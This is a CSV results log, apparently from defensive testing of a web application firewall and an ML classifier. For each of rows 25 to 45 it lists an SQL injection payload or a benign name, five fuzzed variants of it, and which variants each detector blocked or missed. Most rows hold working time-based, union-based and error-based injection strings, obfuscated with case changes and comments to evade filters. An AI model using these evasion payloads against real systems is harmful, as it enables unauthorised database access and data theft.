Sr NO.,Original Timestamp,Payload,Original Status,WAF Status,ML Status,Combined Result,Fuzzed Payload 1,Fuzzed Timestamp 1,WAF Status 1,ML Status 1,Combined Result 1,Fuzzed Payload 2,Fuzzed Timestamp 2,WAF Status 2,ML Status 2,Combined Result 2,Fuzzed Payload 3,Fuzzed Timestamp 3,WAF Status 3,ML Status 3,Combined Result 3,Fuzzed Payload 4,Fuzzed Timestamp 4,WAF Status 4,ML Status 4,Combined Result 4,Fuzzed Payload 5,Fuzzed Timestamp 5,WAF Status 5,ML Status 5,Combined Result 5
25,2024-12-16T20:00:46.147971,-6397%' or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and '%'  =  ',403,403,200,waf_correct_ml_incorrect,-6397%' or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr	 (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  ']'=']'  =  (SELECT 4493)  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (   OR/**/0   )    )    and '%'  =  ',2024-12-16T20:01:02.331674,403,200,waf_correct_ml_incorrect,"-6397%' or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr
 (  112  )  ||chr  (  106  )  ||chr  (  0x71  )  ||  (  select   (  case/**/when   (  ']'=']'  =  (SELECT 4493)  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  7269=7269  )  ||chr  (   OR 0  )  ||chr  (   OR/*]*/0   )    )    and '%'  =  '",2024-12-16T20:01:20.062126,403,200,waf_correct_ml_incorrect,"- or 0%' or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr
 (  112  )  ||chr  (  106  )  ||chr  (  0x71  )  ||  (  select   (  case/**/when   (  ']'=']'  =  (SELECT 4493)  )   then 1 else 0x0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  4463 IN (4462,4463,4464)  )  ||chr  ( 	7269=7269  )  ||chr  (   OR 0  )  ||chr  (   OR/*]*/0   )    )    and/**/'%'  =  '",2024-12-16T20:01:38.756215,403,403,both_correct,"- or 0%' or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr
 (  112  )  ||chr  (  106  )  ||chr  (  0x71  )  ||  (  select   (  case when   (  ']'=']'  =  (SELECT 4493)  )   then  AND 0x1 else 0x0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  4463 IN (1581<>1582,4463,4464)  )  ||chr  ( 
7269=7269  )  ||chr  (   OR 0  )  ||chr  (   OR/*$*/0   )    )    and/**/'%'  =  '",2024-12-16T20:01:58.664022,403,200,waf_correct_ml_incorrect,"- || 0%' or (SELECT 1)  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  '}.m'<>'}.mE'  )  ||chr	 (  112  )  ||chr  (  106  )  ||chr  (  0x71  )  ||  (  select   (  case when   (  ']'=']'  =  (SELECT 4493)  )   then  AND 0x1 else 0x0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  0x116f IN (1581<>1582,4463,4464)/**/ )  ||chr  ( 
7269=7269  )  ||chr  (   OR 0  )  ||chr  (   OR/*TCV;V*/0   )    )    and/**/'%'  =  '",2024-12-16T20:02:19.059593,403,403,both_correct
26,2024-12-16T20:02:40.592698,1%'   )    )     )   or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and    (    (     (  '%'  =  ',403,403,200,waf_correct_ml_incorrect,0x1%'   )    )     )   or (SELECT 1)  =    (  select 3325 LIKE 3325 from pg_sleep  (	 5   )    )    and    (    (     (  '%'  =/**/ ',2024-12-16T20:02:45.924236,403,200,waf_correct_ml_incorrect,0x1%'   )    )     )   or (SELECT 1)  =    (  select 3127=3127 LIKE (SELECT (SELECT 1)) from pg_sleep  (	 5   )    ) 	  and    (    (     (  '%'  =  ',2024-12-16T20:02:53.241320,403,403,both_correct,0x1%'   )    )     )   or (SELECT 1)  =    (  select  AND 1=3127 LIKE (SELECT (SELECT 0xc1b=3099)) from pg_sleep  (  5   )    ) 	  and/*2]*/   (    (     (  '%'  =  ',2024-12-16T20:03:01.560260,403,403,both_correct,"0x1%'   )    )     )   or (SELECT 1)  =    (  select  AND 'W""'<>'W""m'=0xc37 LIKE (SELECT (SELECT 0xc1b= AND 1)) from pg_sleep  (  5   )    ) 
  and/**/   (    (     (/**/ '%'  =  '",2024-12-16T20:03:10.476676,403,403,both_correct,"0x1%'   )    )     )   or (SELECT 0x1)  =    (  select  AND 'W""'<>'W""m'=0xc37 LIKE (SELECT (SELECT 0xc1b= AND (SELECT 1))) from pg_sleep  (  5482<>5483   )   /**/) 	  and/**/   (    (     (/**/ '%'  =  '",2024-12-16T20:03:19.966745,403,403,both_correct
27,2024-12-16T20:03:30.909321,"c/ meneses, 104 6-a",200,200,200,both_correct,"c/	meneses, (SElECT/**/2648 NOT LIKE  AND 1) 6-a",2024-12-16T20:03:31.902474,403,403,both_incorrect,"c/ meneses,/**/(SEleCT/*_C3*/'7bA\ '!='7bA\ ~' NOT LIKE  anD 1)  ANd (SELeCt 1)-a",2024-12-16T20:03:35.284480,403,200,waf_incorrect_ml_correct,"c//**/meneses,/*p*/(sELeCt/*_C3*/'7bA\ ' NOT LIKE '7bA\ ~' NOT LIKE 
ANd 0x1)  AnD (seLEct  OR 0)-a",2024-12-16T20:03:40.225689,403,403,both_incorrect,"c/ meneses,/*p*/(selEcT/*XP8<D*/'7bA\ ' not like '7bA\ ~' NOT LIKE 	aNd 0x1)  And (sElect  oR 0x0)-a",2024-12-16T20:03:46.078740,403,200,waf_incorrect_ml_correct,"c/ meneses,/**/(sELECt/*XP8<D*/'7bA\ ' not like '7bA\ ~' not like  aND/**/0x1)  anD (SELECt  or 0x0)-a",2024-12-16T20:03:51.929902,403,200,waf_incorrect_ml_correct
28,2024-12-16T20:03:57.979537,"1""  )   where 3058  =  3058 union all select null--",403,403,403,both_correct,"(seLECt 1)""  ) 	 WheRe 0xbf2  /**/like   'o' LIke 'o' union all selECT null--",2024-12-16T20:04:00.505304,403,403,both_correct,"(SElecT 0x1)""  ) 	 WheRe 0xbf2   liKe  	'*'='*' union all SelEct null--",2024-12-16T20:04:05.253876,403,403,both_correct,"(SEleCt 0x1)"" /**/) 	 WheRE 0xbf2   LIkE  	'*' lIKE '*' union all SELEct
null--",2024-12-16T20:04:09.772384,403,403,both_correct,"(seLecT 0x1)""  ) 	 WHeRe 0xbf2   LiKe  	'*' lIKE '*' union all SELECT	null--",2024-12-16T20:04:14.633289,403,403,both_correct,"(SELECt 0x1)""  ) 	/**/wHErE 0xbf2   likE  	'*' lIke '*' union all selEcT
null--",2024-12-16T20:04:19.300710,403,403,both_correct
29,2024-12-16T20:04:24.380791," select * from users where id  =  1 or \.<\ union select 1,@@VERSION -- 1",403,403,403,both_correct," SEleCt * FroM users WhERe id 
 LIKe    Or (SeLEcT 0) oR \.<\ union/*f*/SeLEct 'K]0:'!='K]0::',@@VERSION -- 1",2024-12-16T20:04:27.868783,403,403,both_correct," seLEcT * froM users wHEre id 
 LiKE    Or/**/(SeLect 0) oR \.<\ union/**/seleCt	'K]0:' not like 'K] OR 'y'!='y{'::',@@VERSION -- (SELECT 1)@",2024-12-16T20:04:34.015174,403,200,waf_correct_ml_incorrect," seleCt/**/* FrOm users WhEre id 
 LiKE   	Or/**/(selECt 0x0) or \.<\ union/**/SElECt	'K] AND 1:' not like 'K] OR 'y'!='y{'::',@@VERSION -- (SELECT 'I'<>'Ik')@o",2024-12-16T20:04:41.650096,403,200,waf_correct_ml_incorrect," sEleCt/**/* fROm users whEre id 
 Like   	||/**/(SeleCT 0x0) Or \.<\
union/**/SElEcT	'K] AND  AND (SELECT 'z' NOT LIKE 'zI'):' not/**/LIkE 'K] OR 'y'!='y{'::',@@VERSION -- (SELECT 'I'<>'Ik')@o	<",2024-12-16T20:04:50.489670,403,403,both_correct," SELect/**/* from users whErE id 
 Like  /**/	||/**/(SelEct 0x0) Or \.<\ union/**/sELect	'K] AND  AND (SELECT 'z' NOT LIKE 'zI'):' not/**/LiKe 'K] OR 'y'!='y{'::',@@VERSION -- (SELECT 'I'<>'Ik')@o	<dt",2024-12-16T20:05:00.761219,403,403,both_correct
30,2024-12-16T20:05:11.370751,"1%""  )   and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and   (  ""%""  =  """,403,403,403,both_correct,"1%""  )   and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  ( /*@g)Y5*/select   (  elt  (   OR 0  =  9067,0x1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *'""}Y' NOT LIKE '""}Y""'   )  
 )   x from information_schema.character_sets group by x  )  a  )   and   (  ""%""  =  """,2024-12-16T20:05:24.647563,403,403,both_correct," && 1%""  )   and   (  select 4941 LIKE 4941 from  (  select count  (  *  )  ,concat  (/*dTn*/ 0x7171706a71,  ( /*@g)Y5*/select   (  elt  (   OR 0  =  9067,0x1   )    )     )  ,0x717a767a71,floor  (  rand  (  0x0  )  *'""}Y' NOT LIKE '""}Y""'   )  	 )   x from information_schema.character_sets group by x  )  a  )   aNd   (  ""%""  =  """,2024-12-16T20:05:40.476122,403,403,both_correct,"  And  (SELECT 1)%""  )   and   (  select  OR 0 LIKE 4941 from  (  select count  (  *  ) /**/,concat  (/*wE%~*/ 0x7171706a71,  ( /*@g)Y5*/select   (  elt  (   OR 0  =  2781!=2782,0x1   )    )     )  ,0x717a767a71,floor  (  rand  (  0x0  )  *'""}Y' NOT LIKE '""}Y""'   )  	 )   x FrOM information_schema.character_sets group by x  )  a  )   aND   ( 
""%""  =  """,2024-12-16T20:05:57.019470,403,403,both_correct,"  anD  (SeLEcT  ANd 839!=840)%""  )   and   (  select  OR (SELECT/**/0) LIKE 4941 from  (  select count  (  *  ) /**/,concat  (/*=*/ 0x7171706a71,  ( /*@g)Y5*/select   (  elt  (   OR 0  =  2781!=2782,0x1   )    )     )  ,0x717a767a71,floor  (  rand  (  0x0  )  *'""}Y' NOT LIKE '""}Y""'   )    )   x fROM information_schema.character_sets group by x  )  a  )   aNd   ( 
""%""   like   """,2024-12-16T20:06:14.869788,403,403,both_correct,"  and  (SelecT  and 0x347 NOT LIKE 3416 LIKE 3416)%""  )   and   (  select  OR (SELECT/**/0) LIKE 4941 from  (  select count  (  *  ) /**/,concat  (/*=*/ 0x7171706a71,  ( /*@g)Y5*/select   (  elt  (   OR 0  =  2781!= AND 1,0x1   )    )     )  ,0x717a767a71,floor  (/**/ rand  (  0x0  )  *'""}Y' NOT LIKE '""}Y""'   )    )   x FRoM information_schema.character_sets group by x  )  a  )   And   (  ""%""   LIke   """,2024-12-16T20:06:33.968381,403,403,both_correct
31,2024-12-16T20:06:54.278752,"1  )   as auly where 4146  =  4146 or elt  (  5873  =  5873,sleep  (  5   )    )   #",403,403,200,waf_correct_ml_incorrect,"(SELECT 1)  )   As auly whERe 4146  =  4146 OR elt  (  3946 NOT LIKE 3947/**/ 
Like   5873,sleep  (  (SELECT 5)   )    )   #",2024-12-16T20:06:58.314868,403,403,both_correct,"(seLEcT 0x1)  )   aS auly WHErE 4146  =  4146 Or elt  (/**/ 3946 not like 3947/*Ul/q*/ 	liKe   (SELECT 1),sleep  (  (SELECt 6588 NOT LIKE 6589)   )    )   #",2024-12-16T20:07:05.209975,403,403,both_correct,"(SelECt 0x1)  )   as
auly where (SELECT 4146)  =  4146 OR elt  (/*+L:*/ 7183!=7184 not like  OR 0/*Ul/q*/ 	liKe   (seleCt 1),sleep/**/ (  (seLecT 6588 not like 6589)   )    )   #",2024-12-16T20:07:13.692030,403,403,both_correct,"(SelEct 0x1)  )   as
auly WHere (sElect 4146)  =  4146 OR elt  (/**/ 7183<>'#O'<>'#Ot' not like  OR 0/*Ul/q*/ 	liKE   (SELeCT  AND (SELECT 1)),sleep/*t	*/ (  (sELECt/**/6588 not
like 6589)   )    )   #",2024-12-16T20:07:23.353751,403,403,both_correct,"(selEcT 0x1)  )   AS	auly WheRE (sELeCt 4146)  =  4146 oR elt  (/**/ (SELECT 7183)<>'#O'<>'#Ot' not like  oR 0/*Ul/q*/ 	liKe   (sELEct  and (sEleCT 1)),sleep/**/ (  (SelEcT (sElECT 1) not
like '9'='9')   )    )   #mo",2024-12-16T20:07:34.018663,403,403,both_correct
32,2024-12-16T20:07:45.466439,barreras de la bandera,200,200,200,both_correct,"barreras
de/**/la bandera",2024-12-16T20:07:46.633511,200,200,both_correct,barreras de la bandera,2024-12-16T20:07:48.889905,200,200,both_correct,"barreras/**/de la
bandera",2024-12-16T20:07:51.084089,200,200,both_correct,barreras de la	bandera,2024-12-16T20:07:53.390545,200,200,both_correct,barreras de/**/la bandera,2024-12-16T20:07:55.535682,200,200,both_correct
33,2024-12-16T20:07:57.847219,"1   )    )    or 5356  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",403,403,403,both_correct,"(SELeCt 577) LIke 577   )    )    or  aND 1   like /**/   (  selEcT count  (  *  )   FROM sysusers AS	sys1,sysusers aS sys2,sysusers as sys3,sysusers As sys4,sysusers AS sys5,sysusers AS sys6,sysusers as sys7  )  --",2024-12-16T20:08:06.521031,403,403,both_correct,"(SElecT 577) LIke (SeLEct  or 0)   )    )    oR  aNd '}' not like '}y'  	LIKe     (  SeLECt count  (  *  )   fROm sysusers as	sys1,sysusers aS sys2,sysusers As sys3,sysusers AS sys4,sysusers AS sys5,sysusers aS sys6,sysusers aS sys7  )  --",2024-12-16T20:08:18.007862,403,403,both_correct,"(SELECt (SElEcT 577)) LIke (seLECT  oR  anD '}'!='}O')   ) 	  )    OR  And '}' not like '}y' /**/	LikE     (  sElECt count  (  *  )   fROm sysusers as	sys1,sysusers as sys2,sysusers aS sys3,sysusers aS sys4,sysusers AS sys5,sysusers as sys6,sysusers As sys7  )  --",2024-12-16T20:08:30.212784,403,403,both_correct,"(sElEct (SelEcT '&G' lIKe '&G')) LIke (selECT  OR  aNd '}'!='}O')   ) 	  )    or  ANd '}' not like '}y'  	liKE     (  sElECt count  (  *  )   FRom sysusers AS
sys1,sysusers As sys2,sysusers aS sys3,sysusers aS sys4,sysusers AS sys5,sysusers as sys6,sysusers AS sys7  )  --",2024-12-16T20:08:43.924495,403,403,both_correct,"(select (SeLeCT '&G' liKE '&G')) LIkE (selecT  oR  aNd '}' not like '}O')   ) 	  )    oR  AnD '}' not like '}y'  
like     (  SeLECt count  (/**/ *  )   FrOM sysusers AS
sys1,sysusers AS sys2,sysusers AS sys3,sysusers aS sys4,sysusers As sys5,sysusers AS sys6,sysusers aS sys7  )  --",2024-12-16T20:08:57.734164,403,403,both_correct
34,2024-12-16T20:09:12.227057,balcells parets,200,200,200,both_correct,balcells/**/parets,2024-12-16T20:09:13.069847,200,200,both_correct,balcells parets,2024-12-16T20:09:15.044298,200,200,both_correct,balcells/**/parets,2024-12-16T20:09:16.876568,200,200,both_correct,balcells parets,2024-12-16T20:09:18.833530,200,200,both_correct,"balcells
parets",2024-12-16T20:09:20.673229,200,200,both_correct
35,2024-12-16T20:09:22.494236,""" or """"-""",403,403,403,both_correct,"""	or/*Z&ew*/""""-""",2024-12-16T20:09:23.043219,403,200,waf_correct_ml_incorrect,"""
or/*8b*/""""-""",2024-12-16T20:09:24.931507,403,200,waf_correct_ml_incorrect,"""	or/*J_kAQ*/""""-""",2024-12-16T20:09:26.732579,403,200,waf_correct_ml_incorrect,""" or """"-""",2024-12-16T20:09:28.639821,403,403,both_correct,"""/**/or	""""-""",2024-12-16T20:09:30.228838,403,403,both_correct
36,2024-12-16T20:09:31.955958,antigua,200,200,200,both_correct,antigua,2024-12-16T20:09:32.415873,200,200,both_correct,antigua,2024-12-16T20:09:33.859760,200,200,both_correct,antigua,2024-12-16T20:09:35.342362,200,200,both_correct,antigua,2024-12-16T20:09:36.794405,200,200,both_correct,antigua,2024-12-16T20:09:38.251427,200,200,both_correct
37,2024-12-16T20:09:39.727749,sigenza,200,200,200,both_correct,sigenza,2024-12-16T20:09:40.213680,200,200,both_correct,sigenza,2024-12-16T20:09:41.852311,200,200,both_correct,sigenza,2024-12-16T20:09:43.399679,200,200,both_correct,sigenza,2024-12-16T20:09:44.910576,200,200,both_correct,sigenza,2024-12-16T20:09:46.393726,200,200,both_correct
38,2024-12-16T20:09:47.874596,tracisto arroyave,200,200,200,both_correct,"tracisto
arroyave",2024-12-16T20:09:48.794605,200,200,both_correct,tracisto arroyave,2024-12-16T20:09:50.676764,200,200,both_correct,tracisto	arroyave,2024-12-16T20:09:52.610610,200,200,both_correct,tracisto/**/arroyave,2024-12-16T20:09:54.564906,200,200,both_correct,tracisto	arroyave,2024-12-16T20:09:56.655996,200,200,both_correct
39,2024-12-16T20:09:58.587448,1'   )    )    and 7756  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  7756  =  7756  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (   'mmfq'  =  'mmfq,403,403,200,waf_correct_ml_incorrect,1'   )    )    and 7756  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )/**/ ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  7756  =  7756  )   then 0x1 else (SELECT 1) end  )   from dual  )  ||chr  (  '4'='4'  )  ||chr  (  122  )  ||chr  (  118 	)  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (   'mmfq'  =  'mmfq,2024-12-16T20:10:16.940597,403,200,waf_correct_ml_incorrect,1'   )    )    and 7756  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  1832<>1833  )/*&8s!*/ ||chr	 (  113  )  ||chr  (/**/ 112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  7756  =  7756  )   then 0x1 else (SELECT 1) end  )   from dual  )  ||chr  (  '0x4'='4'  )  ||chr  (  122  )  ||chr  (  118 	)  ||chr  (   OR 0  )  ||chr  (  113   )    )     )   and    (    (   'mmfq'  =  'mmfq,2024-12-16T20:10:36.754815,403,200,waf_correct_ml_incorrect,1'   )    )    and 7756  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  1832<>1833  )/*&8s!*/ ||chr	 (  113  )  ||chr  (/**/ 112  )  ||chr  (   OR 0  )  ||chr  (  9649<>9650  )  ||/*2T@8w*/ (  select   (  case when   (  7756  =  7756  )  	then 0x1 else (SELECT 1) end  )   from dual  )  ||chr  (  '0x4'='4'  )  ||chr  (  122  )  ||chr  (  118 	)  ||chr  (   OR (SELECT 0)  )  ||chr  (  113   )    )     )   and    (    (   'mmfq'  =  'mmfq,2024-12-16T20:10:57.397251,403,200,waf_correct_ml_incorrect,"1'   )/**/   )    and 7756  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  (SELECT 1)<>1833  )/*&8s!*/ ||chr	 (  'C'<>'C^'  )  ||chr  (/**/ 112  )  ||chr  (   OR 0  )  ||chr  (  9649<>9650  )  ||/*2T@8w*/ (  select   (  case when   (  7756  =  0x1e4c  )  	then 0x1 else (SELECT 1) end  )   from dual 
)  ||chr  (  '0x4'='4'  )  ||chr  (  122  )  ||chr  (  118 	)  ||chr  (   OR (SELECT 0)  )  ||chr  (  113   )    )     )   and    (    (   'mmfq'  =  'mmfq",2024-12-16T20:11:19.350767,403,200,waf_correct_ml_incorrect,"1'   )/*]H;*V*/   )    and 7756  =  dbms_utility.sqlid_to_sqlhash  /**/(    (   chr  (  (SELECT 0x1)<>1833  )/*&8s!*/ ||chr	 (  'C'<>'C^'  )  ||chr  (/**/ 112  )  ||chr  (   OR 0  )  ||chr  (  9649<>'S6-'!='S6-0'  )  ||/*2T@8w*/ (  select   (  case when   (  7756  =  0x1e4c  )  	then 0x1 else (SELECT 1) end  )   from dual 
)  ||chr	 (  '0x4'='4'  )  ||chr  (   OR 0  )  ||chr  (  118 	)  ||chr  (   OR (SELECT 0)  )  ||chr  (  113   )    )     )   and    (    (   'mmfq'  =  'mmfq",2024-12-16T20:11:42.209198,403,200,waf_correct_ml_incorrect
40,2024-12-16T20:12:06.254343,"1%""   )    )     )   and 4595  =  4595#",403,403,200,waf_correct_ml_incorrect,"'[Yi' like '[Yi'%""   )/**/	  )     )   AND 0x11f3  =   OR 0#",2024-12-16T20:12:08.237964,403,200,waf_correct_ml_incorrect,"'[Yi' Like '[Yi'%""   )/*0x0*/
  )     )   aND 0x11f3  =/**/  || '|O'!='|O""'#",2024-12-16T20:12:12.142569,403,200,waf_correct_ml_incorrect,"'[Yi'/**/likE '[Yi'%""   )/*0x0*/	  )     )   aND 0x11f3  =/**/  || '|O'!='|O""'#4d",2024-12-16T20:12:17.046895,403,200,waf_correct_ml_incorrect,"'[Yi'/**/lIkE '[Yi'%""   )/**/
  )     )   aND 0x11f3  =/**//**/ || '|O'!='|O""'#4d-",2024-12-16T20:12:21.988283,403,200,waf_correct_ml_incorrect,"'[Yi'/**/LIkE '[Yi'%""   )/*0x6:Vlc*/
  )	    )   aND 0x11f3  =/**/  || '|O'!='|O""'#4d-",2024-12-16T20:12:26.936475,403,200,waf_correct_ml_incorrect
41,2024-12-16T20:12:32.077506,847,200,200,200,both_correct,0x34f,2024-12-16T20:12:32.358285,200,200,both_correct,0x34f,2024-12-16T20:12:33.730646,200,200,both_correct,0x34f,2024-12-16T20:12:35.110222,200,200,both_correct,0x34f,2024-12-16T20:12:36.486031,200,200,both_correct,0x34f,2024-12-16T20:12:37.869675,200,200,both_correct
42,2024-12-16T20:12:39.230880,"iif  (  4460  =  1610,1,1/0  )  ",403,403,200,waf_correct_ml_incorrect,"iif  (  4460  =  1610,(SELECT 1),0x1/'f'	LIKE 'f'  ) /**/",2024-12-16T20:12:40.782779,403,403,both_correct,"iif  (  (SelEcT 1)   like   ',w)' NOT LIKE ',w)}',(sELECT 0x1),0x1/'f' Like 'f'  )  ",2024-12-16T20:12:44.841878,403,403,both_correct,"iif  (  (SeLeCT '!%' NOT LIKE '!%R')   LIKE /*""E^	s*/ ',w)' NOT LIKE ',w)}',(selECT 0x1),0x1/ Or 0x0  )  ",2024-12-16T20:12:50.073449,403,403,both_correct,"iif  (  (SELecT '!%' NOT LIKE '!%R')   lIkE /*""E^ s*/ ',w)'/**/not like ',w)}',(seLEct 0x1),0x1/ or 0x0  )  ",2024-12-16T20:12:55.980439,403,403,both_correct,"iif  (  (sEleCt '!%' not like '!%R') 
 lIKe /**/ ',w)' not like ',w)}',(SeLeCT 0x1),0x1/ oR 0x0  )  ",2024-12-16T20:13:02.145792,403,200,waf_correct_ml_incorrect
43,2024-12-16T20:13:07.929982,lopiano,200,200,200,both_correct,lopiano,2024-12-16T20:13:08.406099,200,200,both_correct,lopiano,2024-12-16T20:13:09.857541,200,200,both_correct,lopiano,2024-12-16T20:13:11.314792,200,200,both_correct,lopiano,2024-12-16T20:13:12.783300,200,200,both_correct,lopiano,2024-12-16T20:13:14.245883,200,200,both_correct
44,2024-12-16T20:13:15.697934,"-1802%'   )    )    union all select 1002,1002,1002,1002,1002,1002,1002#",403,403,403,both_correct,"-(selEct/**/1)%'   )    )    union all
select (SELECT 1002),'W'='W',1002,1002,1002,1002,1002#d",2024-12-16T20:13:19.177487,403,403,both_correct,"-(selECT/**/(SeleCt 1))%'   )/**/   )    union all
select (SELECT
(SELECT 1002)),'W'='W',286=286,1002,1002,1002,1002#d.",2024-12-16T20:13:25.020544,403,403,both_correct,"-(SElEcT/**/(sELeCt 1))%'   )/**/   )    union all
select/**/(SELECT
(SELECT
0x3ea)),'W'='W',286 like 286, or 0,1002,1002,6171 LIKE 6171#d.M",2024-12-16T20:13:31.826920,403,403,both_correct,"-(SEleCT/**/(select 1))%'   )/**/   )    union all
select/**/(SELECT	(SELECT
0x3ea)),'W'='W',286 LiKe/**/5423 NOT LIKE 5424, or 0,1002,1002, or (SELECT 0) liKE 6171#d.M""",2024-12-16T20:13:39.514065,403,403,both_correct,"-(SElEcT/**/(selECt 7671 not like 7672))%'   )/**/   )    union all
select (SELECT (SELECT
0x3ea)),'W'='W',286 LikE/*6Dv+*/5423 NOT LIKE 5424, Or 0,1002,1002, oR (sELEcT  AND (SELECT 1)) lIKE 6171#d.M""",2024-12-16T20:13:48.769047,403,403,both_correct
45,2024-12-16T20:13:59.334767,"-6505'   )    )    as jtnp where 1037  =  1037 or elt  (  1032  =  1032,3623  )  --",403,403,200,waf_correct_ml_incorrect,"-(SELECT 1)'   )
   )    as jtnp wHERe 'S' LIKE 'S'   LIKe  /**/1037 or elt  (  0x408  =  1032,3623  )  --",2024-12-16T20:14:03.284414,403,200,waf_correct_ml_incorrect,"-(seLECT  OR 0)'   )
   ) 
  as jtnp wHERe 'S' LIKE 'S'   lIke   1037 oR elt  (  0x408   LIKE   1032,2629 LIKe (SELECT 2629)  )  --",2024-12-16T20:14:09.387907,403,200,waf_correct_ml_incorrect,"-(sElECT  || (SELECT 0))'   )
   )    as jtnp wHERe/**/'S' LIKE 'S'   liKe    AND 1 oR elt  (  0x408   LiKE   3217 LIKE 3217,2629 likE (SElECT 2629)  )  --",2024-12-16T20:14:16.857227,403,403,both_correct,"-(Select   Or  (selecT (SELECT 1)))'   )	   )    as jtnp wHERe 'S' LIKE 'S'   liKe    AND 1 oR elt  (  0x408   LiKE   (SELECT 3217) LIKE 3217,2629 likE (SElECT 'L'<>'LR')  )  --",2024-12-16T20:14:25.161524,403,403,both_correct,"-(sEleCT   or  (seLECT (SElect/**/1)))'   )    )    as jtnp wHERe 'S' LIKE 'S'   liKe    AND 1 oR elt  (  0x408   LiKE   (SELECT  AND 1=4788) LIKE 0xc91,2629 likE (SElECT 'L'<>'LR')  )  --",2024-12-16T20:14:34.600895,403,403,both_correct
